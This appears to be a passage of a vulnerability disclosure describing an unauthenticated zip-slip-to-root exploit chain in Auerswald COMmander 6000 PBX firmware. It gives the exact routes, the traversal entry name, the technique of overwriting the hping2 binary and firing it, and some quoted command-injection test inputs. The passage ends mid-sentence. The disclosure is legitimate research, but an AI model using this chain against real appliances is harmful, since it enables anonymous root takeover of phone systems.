# Auerswald COMmander 6000 / 6000R 8.6D — Zip-Slip in the Provisioning Archive Import Overwrites a Root Binary and Yields Unauthenticated Remote Code Execution (uid=0 root)

Author: 0day Rubbish Research Team
Advisory: https://0day-rubbish.com/blog/auerswald-commander-provisioning-import-zip-slip-binary-hijack-root-rce
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## 1. Overview

### Overview of the finding

The Auerswald COMmander 6000 and COMmander 6000R are closed-source commercial enterprise
IP-PBX / unified-communications appliances running an embedded Linux userland on ARM32. Their
management interface is served by a stock lighttpd 1.4.64 that forwards everything over an
AF_UNIX FastCGI socket to a 3,498,560-byte in-house application binary called `webserver`.
That binary is started by init as root and never drops privilege.

Two unauthenticated HTTP requests, sent with zero cookies and zero credentials, produce
arbitrary code execution as `uid=0(root)` on this appliance:

1. A `multipart/form-data` POST to `/provisioning_data_import`. The handler stores the uploaded
   part under `/data/provisioning/import/<basename>` and then spawns, as root,
   the vendor's bundled minizip extractor:
   `posix_spawn("../minizip/miniunz", "-o", "-x", <zip>, "-d", "/data/provisioning/import/")`.
   Neither the calling application nor the extractor sanitises archive entry names, so an entry
   named `../../../opt/auerswald/hping2` escapes the extraction directory and truncates a
   root-owned, mode-0755 binary with attacker-chosen bytes. Because the write is a truncation of
   an existing file, the original permission bits survive, and the overwritten file stays
   executable without any separate permission primitive.
2. A POST to `/netdiagnostic_execute`, which makes root run
   `/bin/sh -c "/opt/auerswald/hping2 -1 -I eth0  -c 3 <target> -p <port>"`. The command string
   itself is hardened: the diagnostics handler applies an explicit character whitelist to the
   target argument and enumerates the protocol value. That hardening is irrelevant here, because
   the injected value is not the command string but the *contents of a file whose path is a
   compile-time constant in that command string*. The kernel honours the `#!/bin/sh` shebang we
   wrote, runs our script as root, and the diagnostics handler captures the child's stdout into
   the HTTP response body — so execution is confirmed remotely without any out-of-band channel.

The single root cause is the missing containment check on archive entry names inside a
root-privileged extraction (CWE-22, with CWE-434 as the delivery vehicle). The missing
authorization on the two routes involved (CWE-862) is what makes it reachable anonymously, and it
is not a one-off omission: the product's authorization covers only the vendor service-technician
and DAA route families, leaving the hundreds of level-1 through level-3 management routes
unguarded. We prove that structurally in section 3 with a response-code asymmetry on a single
shared handler.

### Overview of the product and its runtime stack

Everything in this paragraph was read out of the shipped image, not out of documentation.

```text
8_6D_000_COMmander60xx.rom      60,719,362 bytes   md5 0ba0ffbfa56bab00e7d12a4cb0b8fcd4
  -> gzip stream, inflated to 201,843,340 bytes
  -> u-boot legacy uImage, magic 0x27051956, multi-file, compression=0, image name "CM6K 128154"
  -> size table at offset 64: [512, 201842752]
  -> 512-byte high-entropy blob at offset 76 (signature or bootstrap payload; purpose not established)
  -> ext2 rev1.0 filesystem at offset 588, 201,842,752 bytes
       volume label  8.6D_000_128154.
       UUID          c47a4c1a-38f6-4ed5-bb07-03ba5da54d9b
       features      dir_index only (no has_journal, i.e. a real ext2)
       9184 inodes, 49272 blocks x 4096 bytes, state clean
  -> rootfs extracted with debugfs rdump (e2fsprogs 1.47.0): 160 MB, 7030 files
```

The vendor build identifier is 8.6D build 128154, read from `/opt/auerswald/version` and
corroborated by the ext2 volume label `8.6D_000_128154.`. This is a single firmware image whose
file name carries the model wildcard `COMmander60xx`; the two models COMmander 6000 and
COMmander 6000R share that image and therefore share the code base, the route table and the
`webserver` binary analysed here. There is one ext2 filesystem in this uImage: a full-image scan
for the ext2 superblock magic `0x53ef` at `sb+56` on a 0x400 stride returned no additional hits,
so no A/B or recovery copy exists inside this container to diff against.

The runtime stack, bottom-up:

```text
kernel 2.6.32-gds1.2 (modules under lib/modules/2.6.32-gds1.2/extra)
  + 25 auer* kernel modules = the hardware abstraction layer (/proc/auer/*, /dev/auer/logger)
busybox init, running as root
  /etc/inittab:      ::respawn:/opt/auerswald/scripts/run-webserver
  run-webserver:     cd /opt/auerswald/web; exec ./webserver ip=127.0.0.1 ipv6=::1
lighttpd 1.4.64 (vendor build, ARM, 16 modules)
  server.username = "web" / server.groupname = "web"     <- drops privilege for the STATIC layer only
  fastcgi.server = ( "/" => (( socket => env.fastcgi_socket, check-local => "disable",
                               x-sendfile => "enable", fix-root-scriptname => "enable" )) )
webserver (3,498,560 bytes, ARM 32-bit EABI5, glibc)     <- FastCGI backend, uid 0, no privilege drop
  .data route table 0x35950c..0x365c84: 750 entries x 16 bytes
  entry layout { const char* name; int AccessLevel; void* handler; int flags(=0) }
Auerswald application daemons: resipd (SIP), vmd, vd, ets, ipgk, doscon, dgserverd,
  remoteproxy, n2n_worker, syslogd, certd, updater, webupdate, certupdater, dbget (SQLite)
```

The glibc point matters for the verification story and is worth stating explicitly: this is an
ARM32 **glibc** userland (the toolchain leaks through as `arm-none-linux-gnueabi` in the RPATH of
shipped binaries), not uClibc. That is what allowed the whole rootfs to be used directly as a
`qemu-arm` sysroot via `QEMU_LD_PREFIX`, with no separately built libc, and it is why both the
application binary and the vendor's own ARM lighttpd could be executed unmodified during
verification. A uClibc target would have needed a matching sysroot we did not have.

Two structural facts remove any need for a privilege-escalation stage:

- `webserver` runs as `uid 0`. The init respawn script contains no `su`, no `setuid` and no
  `chroot` — its entire body is `cd /opt/auerswald/web; exec ./webserver ip=127.0.0.1 ipv6=::1`.
  Inside the binary, a scan for `setuid|seteuid|setgid|initgroups|chroot|capset` yields exactly
  one `prctl` reference and no privilege-dropping call at all. The lighttpd directive
  `server.username = "web"` only lowers the static-file layer; the FastCGI backend is a separate
  process spawned by init at full privilege.
- The entire rootfs contains **zero** suid or sgid binaries. A `find` over the extracted tree for
  `-perm -4000 -o -perm -2000` returned nothing. Every `run-*` service script under
  `/opt/auerswald/scripts/` is likewise consumed by root with no drop.

So there is no escalation surface, and none is needed: any write or execution primitive inside
`webserver` is already a root primitive. That is what makes a zip-slip in an import handler fatal
rather than merely annoying.

### Overview of the testbed and of what that implies

This is a firmware and binary-analysis case, and it was verified dynamically. The verification
instance was **not a physical appliance**. It was a faithful re-instantiation of the shipped
rootfs under user-mode emulation:

- the extracted ext2 rootfs, with the vendor binaries **unmodified** — `webserver`, the vendor's
  own ARM `lighttpd/1.4.64`, `/opt/auerswald/minizip/miniunz` and `/opt/auerswald/hping2`, all
  re-verified by digest at the end of the work;
- `/data` initialised by the vendor's own `data-setup` routine (configuration database
  `konfig9.db`, 105 tables) rather than hand-seeded;
- `unshare -n -m --propagation private` plus `chroot` into that rootfs, with `webserver` started
  as root under `qemu-arm-static -d strace -D /data/log/ws.trace`, which records every `execve`
  the application performs;
- the vendor's ARM lighttpd 1.4.64 started in the outer namespace under `QEMU_LD_PREFIX` with the
  guest `LD_LIBRARY_PATH`, bound to a **loopback-only** host port, bridging the AF_UNIX FastCGI
  socket;
- the vendor's own `server.http-parseopts = ("url-ctrls-reject" => "disable")` and the vendor's
  four FastCGI semantics (`check-local => disable`, `x-sendfile => enable`,
  `fix-root-scriptname => enable`, socket from environment), unchanged;
- nothing at the authorization layer, the routing layer or the sink was widened, stubbed or
  patched. Every observed 401 in this document is a 401 the product produced on its own.

What that boundary means, stated plainly so that no reader over-reads the result: this is
**user-mode emulation of the ARM rootfs, not a physical appliance**, and **no request in our
verification came from a separate network host** — the HTTP client and the appliance stack shared
one machine, over loopback. Consequences we accept and publish: `uname -a` inside the payload
reports the emulation host's kernel string with an `armv7l` machine field (the userland is
correctly the ARM rootfs; the kernel identity is not); the hardware abstraction layer
(`/proc/auer/*`, `/dev/auer/logger`) is absent, which disables application logging and the vendor
service-technician challenge channel but does not touch either hop of this chain, which has zero
HAL dependency; and our lighttpd instance ran a minimal configuration (no IPv6 socket, no TLS
socket) with two directives added during verification (`server.upload-dirs` and
`server.stream-request-body`), a harness change and not a product change.

What the boundary does **not** weaken: the binaries under test are the shipped ones, the routes
are the shipped ones, the extraction command is the shipped one, and the `execve` lines quoted in
section 9 are produced by the product's own code paths executing attacker bytes. The identity
`uid=0(root)` was observed in the product's own process tree, not inferred from the init script.

### Overview of affected scope

The affected component is the provisioning data-import handler inside the vendor `webserver`
binary together with the bundled minizip extractor it invokes. Both ship in firmware 8.6D build
128154 for COMmander 6000 and COMmander 6000R. Only that firmware build was analysed and only
that build was exercised; we make no claim about other firmware lines, other COMmander models, or
the COMpact and COMfortel product families, which are separate product lines even though they
share a vendor. We did not diff against an earlier firmware image, because this uImage contains a
single ext2 filesystem and no previous-version image was available to us offline.

The trigger route `/netdiagnostic_execute` and its `hping2` invocation are present in this build
and were exercised in it. Whether other firmware builds expose the same pairing is an open
question we cannot answer from this image, and the advisory does not assert it.

### Overview of independence

This is not a re-published public issue. The public Auerswald advisory lineage — CVE-2021-40856,
CVE-2021-40857, CVE-2021-40858, CVE-2021-40859 and related entries — contains no
item whose root cause is an unsanitised archive extraction in a provisioning import. The closest
published relatives differ on every axis that matters:

| published item | its mechanism | why this finding is not it |
|---|---|---|
| CVE-2021-40859 (COMpact 5500R) | backdoor-account cluster; its third facet was command execution through a `/debug` endpoint | `/debug` does not exist in this build: no such route in the 750-entry table and `debug.conf` is commented out of the lighttpd include chain. We used no backdoor account and no debug endpoint |
| CVE-2021-40858 (COMpact 5500R) | privilege escalation reading a plaintext admin password via a `fileName=../../` traversal | here the traversal travels inside zip entry names in a request *body*, against an archive extractor, not in a URL path or a SQL query key; the outcome is a root file write, not a password read. In this build the `fileName` surface has become a SQL key (`SELECT %s FROM %s WHERE fileName='%s' LIMIT 1`) |
| CVE-2021-40857 (COMpact 5500R) | `passwd=1` substring turning a sub-admin into an admin | our chain authenticates nothing. No sub-admin account, no password parameter, no session |
| CVE-2021-40856 (COMfortel 1400/2600 IP) | `/about/../` URI confusion bypassing authentication | we bypass no check at all; both routes answered 200 to a cookie-less request in their own right, and we show in section 3 that the product's gate simply does not cover these families |

One adjacent fact belongs in the disclosure but is explicitly **not** part of this finding: the
first facet of CVE-2021-40859, the unauthenticated `about_state` information disclosure, is still
present in this firmware build. The route is AccessLevel 0 and answered 200 to a cookie-less
request, returning the model, type, `pbxId`, version string and serial number. The identifier's
own year is the evidence that this has stood for more than four years while the third facet of the
same published advisory (the `/debug` command-execution surface) was removed in the meantime. That
contrast is useful to the vendor as a regression signal, but we count it as a separate item and
never as part of the root RCE.

## 2. Vulnerability Summary

### Vulnerability Summary table

| field | value |
|---|---|
| Vendor | Auerswald (Germany) |
| Product | COMmander 6000 and COMmander 6000R (one shared firmware image, model wildcard `COMmander60xx`) |
| Firmware | 8.6D build 128154 (`/opt/auerswald/version`; ext2 volume label `8.6D_000_128154.`) |
| Image identity | `8_6D_000_COMmander60xx.rom`, 60,719,362 bytes, md5 `0ba0ffbfa56bab00e7d12a4cb0b8fcd4` |
| Vulnerable component | provisioning data-import handler `auerweb_page_provisioning_data_import` (`webserver`, route entry `0x96818` tail-jumping to `FUNC 0x96400`) plus the bundled extractor `/opt/auerswald/minizip/miniunz` (md5 `36eb80de5ac55a8bbfc31e77c1d10e3d`, 63,260 bytes) |
| Trigger component | `netdiagnostic_execute` handler `FUNC 0x87d8c`, call site `0x880c4`, invoking `/opt/auerswald/hping2` (md5 `afc33cdf96b060e636c463e622b6ae1b`, 74,376 bytes) |
| Root cause | archive entry names are not normalised or contained before extraction, and extraction runs as root with the overwrite flag `-o` |
| Classification | CWE-22 (primary), CWE-434 and CWE-862 (contributing) |
| Authentication | none. Two inbound HTTP requests, zero cookies, zero credentials |
| Requests required | 2 |
| Attacker position | any host that can reach the management listener |
| Privileges gained | `uid=0(root) gid=0(root) groups=0(root)` |
| Interaction | none required |
| Output channel | the diagnostics response body carries the payload's stdout (not blind) |
| Persistence | optional and trivially available (init-respawned `run-*` scripts) but not part of the demonstrated chain |
| Score | 9.8 Critical, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Status | not fixed in the analysed build; no identifier assigned yet |

### Vulnerability Summary mechanics

The chain is one write primitive and one consumption of that write, sharing a single root cause
family but needing both halves to be exploitable at all.

The write half. The import handler is a shared helper: the route table entry at `0x96818` is a
192-byte stub that tail-jumps to `FUNC 0x96400`, a 1048-byte function in
`auerweb_page_provisioning.c`. Its behaviour, recovered at syscall granularity while it ran:

```text
stat64("/data/provisioning/import/")
mkdir("/data/provisioning/import/", 0700)
   ... the application's own multipart parser (web_socketRead) writes the request part to
       /data/provisioning/import/<basename(h_ulfilename)>        <- attacker bytes on disk
access("/data/provisioning/import/<basename>", F_OK) = 0
execve("../minizip/miniunz",
       {"../minizip/miniunz", "-o", "-x",
        "/data/provisioning/import/<basename>", "-d", "/data/provisioning/import/", NULL})
   ... extracted files are then moved into /data/provisioning/
rmdir("/data/provisioning/import/")
failure path: application error 8021, "Aus der Datei konnte nicht gelesen werden"
```

Three properties of that invocation decide the exploit. `-o` means overwrite without prompting.
`-x` means extract using the entry names as given. `-d /data/provisioning/import/` is the base
directory that entry names are resolved against — and nothing between the application and the
extractor ever inspects those names. An entry of `../../../opt/auerswald/hping2` resolves to
`/opt/auerswald/hping2`, because three levels up from `/data/provisioning/import/` is the
filesystem root. The same primitive was demonstrated against three separate destinations in
section 9, including one under `/opt`, so it is a general arbitrary-path root write and not an
`hping2`-specific accident.

Permission semantics are the second decisive property. Files newly created by the slip landed mode
0666, root-owned, on non-tmpfs storage. Files that already existed were truncated in place and
**kept their original mode**. That is what turns a file-write primitive into a code-execution
primitive here without any additional step: `/opt/auerswald/hping2` was mode 0755 before the
write and still mode 0755 after it, so the 256-byte `#!/bin/sh` script we wrote in is directly
executable. No `chmod` primitive, no interpreter confusion, no `LD_PRELOAD`.

The consumption half. `/netdiagnostic_execute` is a diagnostics route that runs, as root:

```text
execve("/bin/sh", {"sh", "-c", "/opt/auerswald/hping2 -1 -I eth0  -c 3 127.0.0.1 -p 0", NULL}) = 247
```

The path `/opt/auerswald/hping2` is a compile-time constant in that string. The handler validates
its user-supplied parameters — a character whitelist and a three-value protocol enumeration — and
that validation is sound for what it covers. It cannot cover the bytes at a constant path. When
the kernel opens that path and finds a shebang, it runs the interpreter on the file we control, in
the same root context, with the same stdout capture. The response body of the diagnostics request
is therefore an execution oracle: whatever our script echoes comes back over HTTP.

### Vulnerability Summary preconditions

- Network reachability of the management listener. The listener address and ports are injected
  from environment variables at startup (`server.bind = env.lighty_bind_first`, and
  `lighttpd_port` / `lighttpd_ssl_port` / `lighttpd_provisioning_port` / `proxy_port` in the
  lighttpd configuration), so the exact port is deployment-configured; our proof of concept takes
  host and port as arguments and defaults to loopback.
- No credentials. No cookies. No session. No CSRF token: the vendor client sets only
  `X-Requested-With: XMLHttpRequest`, which is not an authorization control and which our client
  sends for fidelity.
- No man-in-the-middle or on-path position. Neither request depends on observing traffic, and we
  deliberately did not use the separate unauthenticated packet-capture defect described in
  section 12 as a precondition.
- No hardware abstraction layer, no vendor service-technician channel, no physical access, no
  USB media, no timing window, no race, no memory-layout guess.
- Configuration state is irrelevant. The chain was demonstrated in the freshly initialised state
  and again in a tightened state where a non-empty administrator password hash had been written
  into the configuration database and both processes restarted; both runs reached `uid=0(root)`.

The one precondition that is *not* trivial, and which we document at length because it decides
whether anyone else can reproduce this at all, is the multipart body contract: the part name must
be the file name itself. That is a correctness requirement of the request, not of the
vulnerability, and getting it wrong produces a rejection that looks like protective filtering.
Section 6 covers it.

## 3. Authentication Boundary

### Authentication Boundary — how sessions are issued

Sessions are the product's own construct and are issued by its own login route. The relevant
artefacts, all inside `webserver`:

- `/redirect` (route table AccessLevel 0, handler `0x16abc`) is the login route. It is also the
  only function referencing the string `AUERWEB_COOKIE`. A successful login would set
  `AUERSessionID<serial>` plus `AUERWEB_COOKIE`; the serial is embedded in the cookie name and is
  itself readable without authentication from `about_state`.
- `web_auth` at `0x15958`, 4392 bytes, is the session and credential evaluator. Its log strings
  enumerate five login modes: `%s: Login-Versuch mit Parameteruebergabe user=%s`,
  `%s: Login-Versuch mit Request-Params user=%s`, `%s: Login-Versuch mit DAA user=%s nonce=%s`,
  `%s: Login-Versuch mit ForceAdmin`, and `%s: Authentifizierung: BEARER`, plus session-list
  lookups `%s: SessionId=%s in Sessionliste gefunden AccessLevel=%i` and
  `%s: SessionId=%s NICHT in Sessionliste gefunden`.
- `web_checkAccess` at `0xf5d68` has exactly one caller in the whole binary: `0x15958`. There is
  no second, scattered authorization implementation — the gate is centralised in one function,
  which is good design and makes the coverage question answerable.
- `web_checkDigestAuth` at `0x1345c` is called only from `0xf47f0`.
- A separate vendor service-technician handshake exists at AccessLevel 0:
  `challenge_create` (`0x3b378`) and `challenge_check` (`0x3b23c`), the latter passing the special
  user name `ChallengeKey` into `web_auth` and mapping the returned value to AccessLevel 5
  (`page_servicetools.html`) or 6 (`page_daemontools.html`). Its challenge format was recovered as
  `%d;%04x;` where the hex component derives from an operating-hours counter, the context
  increments a failure counter at `[ctx+0x14c]`, and more than three attempts destroys the context.
  A 65536-wide space with a four-attempt lockout is not brute-forceable, and the response verifier
  at `0x220d68` checks signatures against two DER public keys shipped in the image
  (`0x362048` and `0x362688`, 1598 bytes each, `SubjectPublicKeyInfo` with OID `1.2.840.10040.4.1`
  — id-dsa — and a 4096-bit p). Public-key-only verification is the correct design; the device
  holds no private key, so this channel is not forgeable from the image.

We did not obtain a session, and we did not need one. Attempts against `/redirect` with four
password values across four parameter alias sets produced an empty cookie every time — the login
path is fail-closed, which is the correct behaviour and worth crediting. The `ForceAdmin` and
`BEARER` branches of `web_auth` were not read instruction-by-instruction, so we make **no** claim
about them in either direction; they are unexamined, not disproved, and this chain does not
depend on them.

### Authentication Boundary — what the gate actually checks

The route table in `.data` at `0x35950c..0x365c84` holds 750 named entries of 16 bytes each, in
the layout `{ const char* name; int AccessLevel; void* handler; int flags(=0) }`. The declared
AccessLevel histogram is:

| AccessLevel | entries | observed behaviour of a cookie-less request |
|---|---|---|
| 0 | 14 | 200 with real data |
| 1 | 217 | 200 with real data |
| 2 | 498 | 200 with real data — includes both routes used by this chain |
| 3 | 9 | 200 with real data |
| 4 | 7 | **401** (vendor service-technician family) |
| 6 | 5 | **401** (DAA / daemon-tools family) |

(A separate enumeration of the same table region counted 774 slots; we cite the 750-entry
named-route figure consistently, and nothing in this chain depends on the difference — both routes
we use are AccessLevel 2 in either reading.)

The authorization behaviour is therefore not "the declared level is enforced". It is narrower and
more specific: the gate covers the service-technician family (`servicetools_*`, AccessLevel 4),
the DAA/daemon family (`daemontools_*`, AccessLevel 6), the two packet-capture routes registered
under those families, and `daalogin`. Twelve routes answer 401. The remaining 738 answer 200 to a
request with no cookies. We sampled more than forty of them across levels 0 through 3 during
mapping and every one returned live configuration data or performed a state change.

`daalogin` is instructive: the table records it at AccessLevel 0, yet it answers 401. So the table
field is a declaration, and the enforcement decision is taken elsewhere in the gate logic, per
route family. That is exactly the shape of a systemic coverage gap — one that cannot be found by
reading the level numbers and only shows up when you compare the declared model against observed
response codes.

lighttpd contributes nothing to authorization. Its `fastcgi.conf` has two branches which, taken
together, send every URL to the FastCGI socket: the first branch is a catch-all
(`fastcgi.server = ( "/" => ... )`) for any request without an ip-editor `Referer`, excluding a
whitelist of static paths; the second branch, for requests that *do* carry an ip-editor `Referer`,
routes exactly `/cspviolation`, `/provisioning_data_import` and `/provisioning_data_export`. The
only functional difference between the branches is that the first passes
`fix-root-scriptname => enable` and the second does not — a `SCRIPT_NAME`/`PATH_INFO` shaping
detail, not an authorization one. Three probes with no referer, an ip-editor referer and an
unrelated referer produced no access difference. Consequently all authorization for this product
lives in `web_auth` / `web_checkAccess` inside `webserver`, and it covers 12 of 750 routes.

### Authentication Boundary — the principal required by the sink

None. The sink — the root `posix_spawn` of `miniunz` — is reached in the first request, before any
handler has any reason to ask who the caller is. The principal required by the second sink is also
none: the diagnostics route is AccessLevel 2 and answered 200 with zero cookies.

Both routes were exercised in the same run against a control set of routes that answered 401, so
the 200s cannot be an artefact of a testbed that had authorization switched off. The control set
(`daemontools_state`, `servicetools_state`, `servicetrace.pcap`) returned 401 throughout, in every
round, before and after the exploit, and again in the tightened-configuration run. Meanwhile
`about_state` returned 200 in the same breath. A harness that had lost its session handling would
have answered 200 for all four; a harness with authorization intact but a permissive configuration
would have answered 200 for `about_state` only because it is declared level 0. The observed
pattern — 401, 401, 401, 200, 200 — is the product's own.

### Authentication Boundary — the response-code asymmetry that proves the gap is systemic

The strongest single piece of internal evidence that this is a coverage gap rather than one
missing check sits on a single shared handler.

`FUNC 0x3b018` streams a packet capture back to the caller. It is registered in the route table
three times, under three different names and three different AccessLevels:

| route name | declared AccessLevel | cookie-less request |
|---|---|---|
| `ethernettrace.pcap` | 2 | **200**, `content-type: application/vnd.tcpdump.pcap`, root `tcpdump` started on `eth0` with snaplen 9018 and the capture streamed back to the caller |
| `servicetrace.pcap` | 4 | **401** |
| `daemontools.pcap` | 6 | **401** |

Same function address, same code, three names. Under the service-technician and DAA names the
product demands a session; under the level-2 name it does not. No difference in the handler can
explain that, because there is no difference in the handler. The only variable is the route name
through which it was reached, which means authorization in this product is attached to route
families rather than to the operations those routes expose.

That is precisely why we describe the missing-authorization component of this finding as a
**systemic authorization gap**: the two routes in our chain are not two unlucky omissions in an
otherwise guarded table. They are ordinary members of the 738-route population that the gate does
not cover, and the 401-vs-200 asymmetry on `0x3b018` is the internal proof that a real, working
authorization path exists and is simply scoped to two families.

### Authentication Boundary — what is deliberately not claimed

- We do not claim the login path is bypassable. It is fail-closed in our testing, and we say so.
- We do not claim the `ForceAdmin` or `BEARER` branches of `web_auth` are vulnerable or safe. They
  were not fully disassembled. Unexamined is not disproved.
- We do not claim the vendor service-technician challenge can be forged. It cannot be, from the
  image alone, because verification is public-key only and the device carries no private key.
- We do not claim the AccessLevel number in the route table is the enforced level. It is not;
  `daalogin` is the counterexample in the product's own data.
- We do not claim that all 738 unguarded routes are individually dangerous. We map the population
  and prove the two members this chain needs. The rest is a separate disclosure exercise, and
  section 12 lists what we found there without folding any of it into this score.
- We do not claim a physical appliance was exploited. See section 1's testbed overview and
  section 9's boundary statement.

## 4. Attack Surface

### Attack Surface — listeners, routes and their protection

The inbound surface is the HTTP/HTTPS management listener served by the vendor lighttpd, plus a
separate provisioning listener. From the shipped configuration set (14 files, including
`lighttpd_default.conf`, `fastcgi.conf`, `redirect.conf`, `redirect_default.conf`, `ssl.conf`,
`ssl_provisioning.conf`, `forcehttps.conf`, `security.conf`, `security_csp.conf`):

- Ports are not literal in the configuration. `server.port = lighttpd_port`, with
  `lighttpd_ssl_port`, `lighttpd_provisioning_port` and `proxy_port` alongside, and a dual-stack
  socket block `$SERVER["socket"] == "[::]:" + lighttpd_port`. The values arrive from the
  environment at service start, so the deployed port is a configuration fact we do not assert.
- `server.document-root = env.webs_root`, `server.bind = env.lighty_bind_first`.
- `server.max-request-field-size = 65536` (a single header may be 64 KB) and
  `server.max-request-size = 150000` (a 150 KB request body ceiling).
- `server.http-parseopts = ("url-ctrls-reject" => "disable")`, with the vendor's own comment that
  bare `%` characters in URLs must still be accepted. Permissive URL parsing is a documented
  design choice here, not an accident.
- `alias.url = ("/ipeditor/" => "/data/provisioning/ipeditor/", "/assets/" =>
  "/data/provisioning/ipeditor/client/assets/")` — the phone-provisioning editor's web client is
  served from a writable data partition, which is where the JavaScript that gave us the body
  contract lives.
- `forcehttps.conf` redirects everything to HTTPS with named exceptions, including
  `$HTTP["url"] =~ "^/(ikontbuch|autoprov/)"`, so those two paths are reachable in cleartext even
  when TLS is enforced.
- On the provisioning socket, `ssl.verifyclient.activate = "enable"` but
  `ssl.verifyclient.enforce = "disable"`: a client certificate is accepted and its subject CN is
  mapped to a username (`SSL_CLIENT_S_DN_CN`) but never required.
- `access.conf` (htpassword basic auth) exists in the image and is not included by any
  configuration, so it is a leftover template and must not be mistaken for an auth layer.
- `debug.conf` is commented out of the include chain — the surface that CVE-2021-40859's third
  facet used is gone.

Inside `webserver`, the surface is the 750-entry route table plus a small `.rodata` prefix table
(`ua-profile/` handled at `0x20b58`, `cert/` at `0x213d0`) plus static aliases (`/statics/**`,
`/ipeditor/**`, `/data_img/**`). Protection is the per-route AccessLevel field as filtered by the
gate logic in `web_auth`, which in practice covers only the service-technician and DAA families.

Non-HTTP daemons exist in the image — `resipd` (SIP), `slapd` scaffolding under
`scripts/service.d/slapd` with `/data/etc/slapd.conf`, `proftpd`, `p910nd`, `dnsmasq`, `ssmtp` —
but we did not establish that any of them listens on a reachable inbound interface in this build,
and none of them participates in this chain. We say so rather than assume.

### Attack Surface — how the surface was mapped

Four passes, in this order, each one narrower than the last:

1. **Image and filesystem inventory.** Unpack the `.rom`, locate the ext2 at offset 588, `rdump`
   the whole tree, then enumerate: init scripts, service scripts, binaries by size, configuration
   files, the `scripts/run-*` family, `/etc/passwd` and `/etc/inittab`, and a suid/sgid sweep.
   This is where "webserver is root and nothing in the rootfs is suid" was established.
2. **Complete route-table recovery.** The `.data` region was walked as an array of 16-byte
   entries, resolving each `name` pointer, `AccessLevel` integer and `handler` pointer, yielding
   all 750 named routes with their handlers and levels. That dump is the reason we can talk about
   authorization *coverage* rather than guessing route by route.
3. **Static sink and caller analysis over `webserver`.** Every call site of the five
   `posix_spawn` wrappers and of the popen family was enumerated with the string constants in the
   calling function, giving a candidate command-template inventory. Reachability paths from route
   handlers to each sink were computed. A capstone-based linear sweep decoded 662,944
   instructions (99.7% coverage) to build caller lists, and every 4-byte-aligned word in all
   ALLOC sections was compared against candidate addresses to catch function-pointer references.
   This is how a tempting-looking sink (`auerweb_mini_zip` at `0xedfcc`, whose template contains a
   shell pipeline) was proved to be dead code rather than merely unused.
4. **Dynamic probing of the live stack**, and then the exploit itself.

An important methodological correction came out of step 3. Transitive reachability is not taint
reachability: many route handlers reach a command sink only through a shared
database-commit post-hook that runs constant commands such as `service slapd enable`. Counting
those as injection candidates produced false positives, so every candidate was then checked for
whether the sink's parameter string is actually assembled from HTTP input. That discipline is why
section 5 distinguishes the five wrappers by ABI instead of by name.

### Attack Surface — components that narrow the surface

Several things narrow the surface, and honesty requires listing them because they are the reasons
a naive reader might expect this product to be hardened:

- **Argv-based execution everywhere it matters.** Most command execution in this product goes
  through `posix_spawn` with an argv array and no shell. That is a genuinely good design and it
  defeats command injection and argument injection at dozens of otherwise attractive sites. It was
  verified at `execve` level, not assumed: an upload filename of `aa bb.png` produced
  `execve("/bin/mv", {"mv", "-f", "/data/tmp/aa bb.png", "/data/tmp/<random15>_ztbtmpimage.png", NULL})`
  with spaces, tabs, newlines, `;`, backticks, `$( )`, `*` and `--target-directory=` all surviving
  inside a single argv element and no glob expansion. Seven injection attempts against that sink
  all failed.
- **A real filename sanitizer.** HTTP filename parameters pass through a sanitizer family
  (around `0xf67a4` / `0xf4240`) that lowercases, applies `basename`, and maps metacharacters to
  `_`. It works: `a;touch PWNED_EXP1` lands as `a_touch pwned_exp1`, and `../../data/log/MARKER_C5`
  lands as `marker_c5`.
- **A real character whitelist on the diagnostics route.** The handler at `0x87d8c` holds the
  literal constant `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:/` and applies
  it to the target argument; the protocol parameter is a three-value enumeration. Injecting `;` or
  a backtick results in the whole parameter being rejected, with the response
  `netdiagnostic - error: 1 Ping: kein Ziel angegeben` and **zero** `execve` in the trace.
- **Fail-closed login**, a public-key-only service-technician handshake with a four-attempt
  lockout, and a removed `/debug` surface.

All four of those narrow the surface against *string* injection. None of them looks at archive
entry names, and none of them protects the bytes at a constant binary path. That is the gap this
chain occupies: the product had hardened the three obvious ways to attack a command sink and left
the fourth — replace the file the command already names — unaddressed, while separately leaving the
routes themselves unauthenticated.

## 5. Sink Identification

### Sink Identification — how the sink was found

Execution in this product converges on five wrappers in `auer_systemcalls.cpp`, all of which call
`posix_spawn` and all of which log through `run shell cmd: %s` with a failure message of
`posix_spawn() failed with error=%d! cmd: %s`:

| address | name | form | call sites in `webserver` |
|---|---|---|---|
| `0x2247f0` | `auer_systemf_insecure` | assembles a string and runs it under a shell | 16 |
| `0x224c3c` | `_auer_systemf_echo` | shell form, captures stdout | 1 (`0xb6318`, `updownload_state`) |
| `0x225168` | `_auer_systemf_returncode` | argv array, captures the exit status, no shell | 39 |
| `0x225360` | `auer_systemv_block` | argv array, blocking, no shell | 0 |
| `0x2255b4` | `_auer_systemf_async` | asynchronous | 4 (`0xc47c0`, `0xe68c0`, `0xed55c`, `0x1963d4`) |

A further six sites use popen directly (`web_writePipeResponseFn` at `0xee654`,
`auerweb_downloadPipeData` at `0xeea64`, `/sbin/ifconfig %s` at `0x217570`,
`udhcpc -h "%s"` at `0x235ecc`, and the two `updater` sites at `0xb4d18` and `0xb511c`).

The sink for the write half was found by following the import route, not by grepping for dangerous
strings. The route entry `provisioning_data_import` points at `0x96818`; that 192-byte stub
tail-jumps to `FUNC 0x96400`; inside `0x96400` there is a call to a small helper in
`auerweb_minizip.c`, `FUNC 0xedf60`, exactly 108 bytes, whose entire purpose is to run the
extractor. Its constants and its call instruction are:

```text
0x00edf6c   "-o"
0x00edf70   "-x"
0x00edf78   "-d"
0x00edf88   "../minizip/miniunz"
0x00edf90   bl #0x225168        ; _auer_systemf_returncode -> posix_spawn(argv), no shell
```

`FUNC 0xedf60` has exactly two callers: `0x948b8`
(`auerweb_page_provisioning_downloadConfigurator`) and `0x96400`
(`auerweb_page_provisioning_data_import`). So the extractor is reachable from two provisioning
routes, one of which is ours.

The sink for the consumption half was found earlier and independently, while mapping unauthenticated
state-changing routes: `netdiagnostic_execute` (AccessLevel 2, handler `FUNC 0x87d8c`, call site
`0x880c4`) whose whole-function string set is `commandLineUrl`, `commandLineProtokoll`,
`commandLinePort`, the whitelist constant, `tcp`, `udp`, `icmp`, `commandLineProtokoll %s `,
